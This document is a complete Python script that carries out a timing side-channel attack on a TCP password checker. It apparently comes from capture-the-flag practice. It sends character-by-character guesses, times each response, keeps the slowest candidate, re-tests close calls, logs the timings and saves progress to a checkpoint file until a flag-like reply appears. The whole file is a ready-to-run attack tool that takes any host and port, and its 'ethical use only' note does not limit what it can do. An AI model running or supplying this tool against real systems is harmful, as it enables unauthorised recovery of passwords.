# ```python
#!/usr/bin/env python3
"""
timing_attack.py

Educational demo of a TCP timing side-channel attack against a line-based
password checker that compares strings byte-by-byte.

USAGE (examples):
  python timing_attack.py --host 127.0.0.1 --port 8080
  python timing_attack.py --host 127.0.0.1 --port 8080 --prefix ABC
  python timing_attack.py --host 127.0.0.1 --port 8080 --resume

Ethical use only: run on systems you own or have permission to test.
"""

from __future__ import annotations
import argparse
import csv
import os
import socket
import statistics
import sys
import time
from typing import List, Tuple

# ---------------- Tunables (defaults are reasonable) ---------------- #
DEFAULT_CHARSET = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
DEFAULT_MAX_PASS_LEN = 32
DEFAULT_BASE_SAMPLES = 10
DEFAULT_RETEST_SAMPLES = 40
DEFAULT_TOP_RETEST = 4
DEFAULT_TIMEOUT = 4.0
DEFAULT_LOGFILE = "timings_log.csv"
DEFAULT_CHECKPOINT_FILE = "prefix.chk"
MIN_DIFF_ACCEPT = 0.010  # accept top char if >= this faster than runner-up
MIN_DIFF_WEAK = 0.005    # re-test if diff smaller than this threshold
# -------------------------------------------------------------------- #


def query_once(host: str, port: int, candidate: str, timeout: float) -> Tuple[float, str]:
    """
    Send a single-line candidate to the TCP service and measure elapsed time.

    Parameters
    ----------
    host : str
        Target hostname or IP.
    port : int
        Target TCP port.
    candidate : str
        Password guess (a single line).
    timeout : float
        Socket connect/read timeout in seconds.

    Returns
    -------
    (elapsed_seconds, response_text)
        The total elapsed time and any decoded text response received.
    """
    try:
        t0 = time.perf_counter()
        sock = socket.create_connection((host, port), timeout=timeout)
        sock.sendall((candidate + "\n").encode())
        resp = b""
        sock.settimeout(0.6)
        try:
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                resp += chunk
        except socket.timeout:
            pass
        finally:
            sock.close()
        dt = time.perf_counter() - t0
        return dt, resp.decode(errors="replace")
    except Exception as e:
        return float("inf"), f"EXCEPTION: {e}"


def median_time(host: str, port: int, candidate: str, samples: int, timeout: float) -> Tuple[float, str, List[float]]:
    """
    Measure the median response time for a given candidate over multiple samples.

    Returns
    -------
    (median_seconds, last_response, sample_times)
    """
    times: List[float] = []
    last_resp = ""
    for _ in range(samples):
        t, resp = query_once(host, port, candidate, timeout)
        times.append(t)
        last_resp = resp
    return statistics.median(times), last_resp, times


def looks_like_flag(text: str) -> bool:
    """
    Heuristic: detect a 'success' response (non-'Wrong!' or contains a typical marker).
    """
    if not text:
        return False
    up = text.upper()
    if "FLAG" in up or "CTF" in up or "SCAD" in up or "{" in text:
        return True
    if "WRONG" not in up and "ENTER" not in up and len(text.strip()) > 0:
        return True
    return False


def write_log(logfile: str, row: List[str]) -> None:
    """
    Append a CSV row to the timings log (creates the header on first write).
    """
    header_needed = not os.path.exists(logfile)
    with open(logfile, "a", newline="", encoding="utf-8") as f:
        w = csv.writer(f)
        if header_needed:
            w.writerow(["timestamp", "candidate", "median_time", "sample_times", "response_preview"])
        w.writerow(row)


def save_checkpoint(fname: str, prefix: str) -> None:
    """
    Save the current recovered prefix to a checkpoint file.
    """
    with open(fname, "w", encoding="utf-8") as f:
        f.write(prefix)


def load_checkpoint(fname: str) -> str:
    """
    Load a recovered prefix from a checkpoint file (if present).
    """
    if not os.path.exists(fname):
        return ""
    with open(fname, "r", encoding="utf-8") as f:
        return f.read().strip()


def run_attack(
    host: str,
    port: int,
    charset: str,
    max_len: int,
    base_samples: int,
    retest_samples: int,
    top_retest: int,
    timeout: float,
    logfile: str,
    checkpoint_file: str,
    start_prefix: str,
    resume: bool,
) -> None:
    """
    Run the iterative timing attack, starting from an optional prefix or checkpoint.
    """
    # derive starting prefix
    if start_prefix:
        found = start_prefix
        print(f"[i] Starting from provided prefix: '{found}'")
    elif resume:
        found = load_checkpoint(checkpoint_file)
        if found:
            print(f"[i] Resuming from checkpoint '{checkpoint_file}' -> '{found}'")
        else:
            found = ""
            print(f"[i] No checkpoint found; starting empty prefix.")
    else:
        found = ""

    print(f"[i] Target: {host}:{port} | charset={len(charset)} symbols | base_samples={base_samples}")

    for pos in range(len(found), max_len):
        print(f"\n--- Position {pos+1} | prefix='{found}' ---")
        results: List[Tuple[float, str, str, List[float]]] = []

        for ch in charset:
            cand = found + ch
            med, last_resp, samples = median_time(host, port, cand, samples=base_samples, timeout=timeout)
            results.append((med, ch, last_resp, samples))
            preview = (last_resp or "").strip()[:60].replace("\n", " ")
            print(f" tried '{ch}' -> median {med:.5f}s | resp:'{preview}'")
            write_log(logfile, [time.strftime("%Y-%m-%d %H:%M:%S"), cand, f"{med:.6f}", ";".join(f"{x:.6f}" for x in samples), (last_resp or "").strip()[:200]])
            if looks_like_flag(last_resp):
                print("\n[✓] Possible success response detected:")
                print(last_resp.strip())
                return

        # pick top by median time
        results.sort(reverse=True, key=lambda x: x[0])
        top_med, top_char, _, _ = results[0]
        runner_med, runner_char, _, _ = results[1]
        diff = top_med - runner_med
        print(f"\n[i] top='{top_char}' {top_med:.5f}s | runner='{runner_char}' {runner_med:.5f}s | diff={diff:.5f}s")

        # accept or re-test
        if diff >= MIN_DIFF_ACCEPT:
            chosen = top_char
            print(f"[i] Accepting '{chosen}' (diff ≥ {MIN_DIFF_ACCEPT:.3f}s).")
        elif diff < MIN_DIFF_WEAK:
            print(f"[i] Small diff (< {MIN_DIFF_WEAK:.3f}s). Re-testing top {top_retest} with {retest_samples} samples...")
            re_candidates = [c for (_, c, _, _) in results[:top_retest]]
            retest: List[Tuple[float, str]] = []
            for c in re_candidates:
                cand = found + c
                med, last_resp, samples = median_time(host, port, cand, samples=retest_samples, timeout=timeout)
                retest.append((med, c))
                print(f"  re-test '{c}' -> median {med:.6f}s")
                write_log(logfile, [time.strftime("%Y-%m-%d %H:%M:%S"), cand+"-retest", f"{med:.6f}", ";".join(f"{x:.6f}" for x in samples), (last_resp or '').strip()[:200]])
                if looks_like_flag(last_resp):
                    print("\n[✓] Possible success during re-test:")
                    print(last_resp.strip())
                    return
            retest.sort(reverse=True)
            chosen = retest[0][1]
            print(f"[i] After re-test, chosen '{chosen}'.")
        else:
            chosen = top_char
            print(f"[i] Moderate diff; choosing '{chosen}'. Consider more samples if unstable.")

        # update prefix + checkpoint
        found += chosen
        try:
            save_checkpoint(checkpoint_file, found)
            print(f"[i] Saved checkpoint: '{found}' -> {checkpoint_file}")
        except Exception as e:
            print(f"[!] Warning: could not save checkpoint: {e}")

        # quick sanity check: send current prefix alone
        t, resp = query_once(host, port, found, timeout)
        print(f"[i] Check prefix -> {t:.5f}s | resp:'{(resp or '').strip()[:200]}'")
        write_log(logfile, [time.strftime("%Y-%m-%d %H:%M:%S"), found+"-check", f"{t:.6f}", "", (resp or '').strip()[:200]])
        if looks_like_flag(resp):
            print("\n[✓] Success response detected:")
            print(resp.strip())
            return

    print("[×] Reached max length without success. Try more samples or a larger max length.")


def parse_args() -> argparse.Namespace:
    """
    Parse command-line arguments.
    """
    p = argparse.ArgumentParser(description="Educational TCP timing attack demo (CTF style).")
    p.add_argument("--host", required=True, help="Target host or IP (no defaults to avoid leaking real targets).")
    p.add_argument("--port", required=True, type=int, help="Target TCP port.")
    p.add_argument("--charset", default=DEFAULT_CHARSET, help="Candidate character set.")
    p.add_argument("--max-len", type=int, default=DEFAULT_MAX_PASS_LEN, help="Max password length to attempt.")
    p.add_argument("--base-samples", type=int, default=DEFAULT_BASE_SAMPLES, help="Baseline samples per guess.")
    p.add_argument("--retest-samples", type=int, default=DEFAULT_RETEST_SAMPLES, help="Samples for re-testing top candidates.")
    p.add_argument("--top-retest", type=int, default=DEFAULT_TOP_RETEST, help="How many top candidates to re-test.")
    p.add_argument("--timeout", type=float, default=DEFAULT_TIMEOUT, help="Socket timeout in seconds.")
    p.add_argument("--logfile", default=DEFAULT_LOGFILE, help="CSV log filename.")
    p.add_argument("--checkpoint-file", default=DEFAULT_CHECKPOINT_FILE, help="Checkpoint filename.")
    p.add_argument("--prefix", default="", help="Start from this known prefix.")
    p.add_argument("--resume", action="store_true", help="Resume from checkpoint if present.")
    return p.parse_args()


def main() -> None:
    args = parse_args()
    run_attack(
        host=args.host,
        port=args.port,
        charset=args.charset,
        max_len=args.max_len,
        base_samples=args.base_samples,
        retest_samples=args.retest_samples,
        top_retest=args.top_retest,
        timeout=args.timeout,
        logfile=args.logfile,
        checkpoint_file=args.checkpoint_file,
        start_prefix=args.prefix,
        resume=args.resume,
    )


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user.")
        sys.exit(0)
